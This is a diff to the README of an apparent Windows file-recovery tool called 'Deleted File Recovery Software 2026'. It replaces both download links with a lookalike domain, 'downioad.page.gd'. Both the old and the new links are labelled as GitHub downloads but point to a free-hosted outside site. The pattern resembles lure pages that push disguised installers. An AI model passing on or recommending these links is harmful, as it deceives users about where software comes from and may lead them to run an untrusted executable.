@@ -2,7 +2,7 @@
 
 Deleted File Recovery Software 2026 is a comprehensive utility designed for Windows 10 and 11 users to retrieve accidentally deleted or lost files. This tool efficiently scans storage devices to recover data from various scenarios, ensuring your important files are restored in 2026 and beyond.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -71,6 +71,6 @@ Deleted File Recovery Software 2026 is provided "as is" without any warranty. Re
 
 For the latest version of Deleted File Recovery Software 2026, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: December 2026
